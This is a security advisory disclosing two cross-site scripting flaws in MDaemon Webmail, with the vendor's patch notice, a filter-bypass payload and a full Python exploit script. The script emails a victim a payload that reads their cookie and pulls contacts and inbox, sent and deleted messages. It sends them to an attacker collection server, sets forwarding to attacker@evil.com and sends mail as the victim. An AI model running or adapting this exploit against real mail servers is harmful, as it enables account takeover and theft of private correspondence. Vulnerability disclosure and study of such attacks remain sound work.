**Vulnerabilities Summary**  
The following advisory describes two XSS vulnerabilities found in MDaemon Mail Server which lets attackers send emails with malicious payloads and run client side code on victim's browsers just by opening an email.

**CVE**  
CVE-2019-8983  
CVE-2019-8984

**Credit**  
An independent security researcher, Zhong Zhaochen, has reported this vulnerability to SSD Secure Disclosure program.

**Affected systems**  
MDaemon mail Server versions 14.0.x - 18.5.x

**Vendor Response**

> Two cross-site scripting (XSS) vulnerabilities in MDaemon Webmail (WorldClient) were recently reported by [SecuritiTeam Secure Disclosure (SSD)](https://ssd-disclosure.com/). These vulnerabilities may impact all browser types.
>
> To address this issue, the development team at MDaemon Technologies has released patches for affected versions of MDaemon.
>
> For specific information, see the **[Affected Software Section](https://www.altn.com/Support/SecurityUpdate/MD021519_MDaemon_EN/#Selection)** below.
>
> **Recommendation:**
>
> For MDaemon installations, MDaemon Technologies recommends that administrators download and install the appropriate update listed below.
>
> **Known Issues:**
>
> There are no known issues that customers may experience when installing this patch.

**Vulnerability Details**

The first vulnerability lies in the html attachment feature of MDaemon. Attackers can send malicious html documents, and when the victim will open the attachment, it'll be opened in the browser and will run the attacker's client side code.

<img src="https://ssd-disclosure.com/wp-content/uploads/2019/02/Mdaemon-email-attachment-300x142.png" width="80%" height="100%">
When the victim clicks the html file with this content:

<script>alert(window.location)</script>

It will open the attachment immediately and will run the attackers client side code.

<img src="https://ssd-disclosure.com/wp-content/uploads/2019/02/Mdaemon-attachment-click-300x288.png" width="50%" height="100%">
The second XSS vulnerability is inside the content itself of the email. Attackers can exploit this vulnerability in order to steal any folder/contact of the victim's email and forward them to himself. 

The Mdeamon server serves the XSS content with an error method.

The XSS filter don't deal well with the "<!----" as the attribute of the html element which can bypass the XSS filter. We can bypass the filter in this way:

<svg <!----test----="" onload="alert(123)">

Once the victim opens the mail with the malicious payload, the code that the attacker injected will run immediately. 

**Exploit:**

This is exploit which will send from attackers email a malicious email to the victim with a payload that will send back the attacker the victim's mails.
```python
#coding=utf-8

from email.header import Header
from email.mime.text import MIMEText
from email.utils import parseaddr, formataddr
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import smtplib

#---------------------------setting--------------------------------#
# the attacker's email info #Test with MDaemon email
mail_host="test.com"            
mail_user="attacker@test.com"     
mail_pass="Password123"             

# set the victorm
victim = "victim@test.com"      #MDaemon Email    maildomin.com:3000

# set the keywords
keywords_receive = "[]"  
keywords_send = "[]"  
keywords_delete = "[]"  
keywords = "[]"

# set the max count
max_count_recevie = 300
max_count_send = 300
max_count_delete = 300

# set the browser, chrome has some errors when use svg.
# in fact,this is no needed. We can put two payloads together in the email.
browser = 'others'  #['chrome','others']


# set the receiver's server.
xss_platform = 'http://192.168.142.132/receiveinfo/message_receive.php'

# email forward
ForwardingAddress = 'attacker@evil.com'

#MITM attack
send_attack_to_who = 'last@test.com'
Subject = 'title Hello!'
body = 'This is body!!!'

# open different functions
function = ['forwarding','contact','receive','send','delete']
#function = ['test']


sent_content = "THe email content!!!!"

def _format_addr(s):
    name, addr = parseaddr(s)
    return formataddr((Header(name, 'utf-8').encode(), addr))

def send_mail():

    from_addr = mail_user
    password = mail_pass
    smtp_server = mail_host
    to_addr = victim

    msg = MIMEMultipart()
    key_words = {}
    content = sent_content + gen_js()

    msg['From'] = _format_addr('%s' % from_addr)   
    msg['To'] = _format_addr('%s' % to_addr)      
    msg['Subject'] = Header('Read the email!', 'utf-8').encode()  

    msg.attach(MIMEText(content, 'html', 'utf-8'))
    server = smtplib.SMTP(mail_host, 25)   
    #server.set_debuglevel(1)
    server.login(from_addr, password)
    server.sendmail(from_addr, to_addr, msg.as_string())
    server.quit()


contact = '''
                try{
                newURL = currentURL.replace(/BlankMessageBody/,'Contacts');
                xmlhttp1=new XMLHttpRequest();
                url = newURL
                xmlhttp1.open('GET',url,false);
                xmlhttp1.send(null);
                response = xmlhttp1.responseText;
                var to_send1 = 'a=' + window.btoa(encodeURIComponent(response)) + decodeURIComponent('%26b=') + window.btoa(encodeURIComponent(user));
                xmlhttp4=new XMLHttpRequest();
                server = ' ''' + xss_platform + ''' '
                xmlhttp4.open('POST',server,false);
                xmlhttp4.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                xmlhttp4.send(to_send1);}catch(error){}
            '''

receive = '''
                try{    
                if('&View=Main')           
                newURL1 = currentURL.replace(/BlankMessageBody/,'List');
                EURL = currentURL.replace(/BlankMessageBody/,'Message');
                var all_email = new Array();
                var max_count = ''' + str(max_count_recevie) + ''';
                var key_words =''' + keywords_receive + ''';
                var max_page = 1;
                var page=1;
                for(page;page<max_page+1;page++){
                xmlhttp2=new XMLHttpRequest();
                url1 = newURL1 + decodeURIComponent('%26ReturnJavaScript=1%26FolderID=0%26Page=') + page
                xmlhttp2.open('GET',url1,false);
                xmlhttp2.send(null);
                response1 = xmlhttp2.responseText;
                data1 =JSON.parse(response1);
                max_page = data1.changeMultiPage.totalPages;
                for(var a in data1.scripts){
                all_email.push(data1.scripts[a].id); } }
                if(max_count>=all_email.length || max_count==0 ){
                max_count=all_email.length;}
                for(var i=0;i<max_count;i++ ){
                xmlhttp3=new XMLHttpRequest();
                eurl = EURL + decodeURIComponent('%26ReturnJavaScript=1%26ContentType=JavaScript%26FolderID=0%26Number=') + all_email[i];
                xmlhttp3.open('GET',eurl,false);
                xmlhttp3.send(null);
                email_response = xmlhttp3.responseText;
                var flag = 0;
                if(key_words.length==0){flag=1;}
                for(var k in key_words){
                if(email_response.match(key_words[k])!=null){flag=1;}}
                if(flag==0){continue;}
                var to_send = 'a=' + window.btoa(encodeURIComponent(email_response)) + decodeURIComponent('%26b=') + window.btoa(encodeURIComponent(user));
                xmlhttp4=new XMLHttpRequest();
                server = ' ''' + xss_platform + ''' '
                xmlhttp4.open('POST',server,false);
                xmlhttp4.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                xmlhttp4.send(to_send); }}catch(error){}
            '''

send = '''
                try{                                
                newURL1 = currentURL.replace(/BlankMessageBody/,'List');
                EURL = currentURL.replace(/BlankMessageBody/,'Message');
                var all_email = new Array();
                var max_count = ''' + str(max_count_send) + ''';
                var key_words =''' + keywords_send + ''';
                var max_page = 1;
                var page=1;
                for(page;page<max_page+1;page++){
                xmlhttp2=new XMLHttpRequest();
                url1 = newURL1 + decodeURIComponent('%26ReturnJavaScript=1%26FolderID=9%26Page=') + page
                xmlhttp2.open('GET',url1,false);
                xmlhttp2.send(null);
                response1 = xmlhttp2.responseText;
                data1 =JSON.parse(response1);
                max_page = data1.changeMultiPage.totalPages;
                for(var a in data1.scripts){
                all_email.push(data1.scripts[a].id); } }
                if(max_count>=all_email.length || max_count==0 ){
                max_count=all_email.length;}
                for(var i=0;i<max_count;i++ ){
                xmlhttp3=new XMLHttpRequest();
                eurl = EURL + decodeURIComponent('%26ReturnJavaScript=1%26ContentType=JavaScript%26FolderID=9%26Number=') + all_email[i];
                xmlhttp3.open('GET',eurl,false);
                xmlhttp3.send(null);
                email_response = xmlhttp3.responseText;
                var flag = 0;
                if(key_words.length==0){flag=1;}
                for(var k in key_words){
                if(email_response.match(key_words[k])!=null){flag=1;}}
                if(flag==0){continue;}
                var to_send = 'a=' + window.btoa(encodeURIComponent(email_response)) + decodeURIComponent('%26b=') + window.btoa(encodeURIComponent(user));
                xmlhttp4=new XMLHttpRequest();
                server = ' ''' + xss_platform + ''' '
                xmlhttp4.open('POST',server,false);
                xmlhttp4.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                xmlhttp4.send(to_send); }}catch(error){}
            '''

delete = '''
                try{                 
                newURL1 = currentURL.replace(/BlankMessageBody/,'List');
                EURL = currentURL.replace(/BlankMessageBody/,'Message');
                var all_email = new Array();
                var max_count = ''' + str(max_count_delete) + ''';
                var key_words =''' + keywords_delete + ''';
                var max_page = 1;
                var page=1;
                for(page;page<max_page+1;page++){
                xmlhttp2=new XMLHttpRequest();
                url1 = newURL1 + decodeURIComponent('%26ReturnJavaScript=1%26FolderID=10%26Page=') + page
                xmlhttp2.open('GET',url1,false);
                xmlhttp2.send(null);
                response1 = xmlhttp2.responseText;
                data1 =JSON.parse(response1);
                max_page = data1.changeMultiPage.totalPages;
                for(var a in data1.scripts){
                all_email.push(data1.scripts[a].id); } }
                if(max_count>=all_email.length || max_count==0 ){
                max_count=all_email.length;}
                for(var i=0;i<max_count;i++ ){
                xmlhttp3=new XMLHttpRequest();
                eurl = EURL + decodeURIComponent('%26ReturnJavaScript=1%26ContentType=JavaScript%26FolderID=10%26Number=') + all_email[i];
                xmlhttp3.open('GET',eurl,false);
                xmlhttp3.send(null);
                email_response = xmlhttp3.responseText;
                var flag = 0;
                if(key_words.length==0){flag=1;}
                for(var k in key_words){
                if(email_response.match(key_words[k])!=null){flag=1;}}
                if(flag==0){continue;}
                var to_send = 'a=' + window.btoa(encodeURIComponent(email_response)) + decodeURIComponent('%26b=') + window.btoa(encodeURIComponent(user));
                xmlhttp4=new XMLHttpRequest();
                server = ' ''' + xss_platform + ''' '
                xmlhttp4.open('POST',server,false);
                xmlhttp4.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                xmlhttp4.send(to_send); } }catch(error){}
            '''

forwarding = '''
                try{                
                newURL2 = currentURL.replace(/BlankMessageBody/,'Options-Prefs');
                eurl = newURL2 + decodeURIComponent('%26Save=Yes%26ReturnJavaScript=Yes');
                var to_send = decodeURIComponent('ForwardingEnabled=Yes%26ForwardingAddress='''+ ForwardingAddress +'''%26ForwardingRetainCopy=Yes');                
                xmlhttp3=new XMLHttpRequest();
                xmlhttp3.open('POST',eurl,false);
                xmlhttp3.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                xmlhttp3.send(to_send);}catch(error){}

'''

mitm = '''
                try{
                newURL = currentURL.replace(/BlankMessageBody/,'Compose');
                xmlhttp1=new XMLHttpRequest();
                url = newURL + decodeURIComponent('%26ComposeInNewWindow=Yes%26ChangeView=No%26SendNow=Yes');
                xmlhttp1.open('POST',url,false);
                xmlhttp1.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                letter = decodeURIComponent('Attachment=%26ComposeUser=AGdsXhNOEJOGhG7lRyMJ%26ComposeID=1%26Attn=%26Company=%26From=0%26Reply-To=%26SaveSentMessage=No%26To=''' +send_attack_to_who+'''%26CC=%26BCC=%26Subject=t''' + Subject + '''%26Body=test2%26BodyHTML='''+ body +'''\');
                xmlhttp1.send(letter);
                response = xmlhttp1.responseText;}catch(error){}
'''
test = '''
                try{
                alert('You are hacked!!!!') }catch(error){}
            '''
user = '''      
                try{
                var user = 'unknow';
                var pos=document.cookie.toLowerCase().indexOf('user=') + 5;
                subcookie = document.cookie.substring(pos);
                var pos1 = subcookie.indexOf(';');
                if(pos1!=-1){ user = subcookie.substring(0,pos1);
                }else{user = subcookie }}catch(error){}
                currentURL = window.location.href;
                if(currentURL.indexOf('View=Main') > 0){
                currentURL = currentURL.replace(/Main/,'BlankMessageBody');}
'''
#function = ['forwarding','contact','receive','send','delete','mitm']
def gen_js():
    if browser == 'chrome':     
        attact_js = '''<img/<!----test----/onerror="''' + user
        if 'forwarding' in function:
            attact_js += forwarding     
        if 'mitm' in function:
            attact_js += mitm  
        if 'contact' in function:
            attact_js += contact  
        if 'receive' in function:
            attact_js += receive  
        if 'send' in function:
            attact_js += send  
        if 'delete' in function:
            attact_js += delete  
        if 'test' in function:
            attact_js += test  
        attact_js += '''" src="#">'''  
    else:
        attact_js = '''<svg/<!----test----/onload="''' + user
        if 'forwarding' in function:
            attact_js += forwarding     
        if 'mitm' in function:
            attact_js += mitm   
        if 'contact' in function:
            attact_js += contact  
        if 'receive' in function:
            attact_js += receive  
        if 'send' in function:
            attact_js += send  
        if 'delete' in function:
            attact_js += delete  
        if 'test' in function:
            attact_js += test                    
        attact_js += '''">'''  
    return attact_js

send_mail()
```
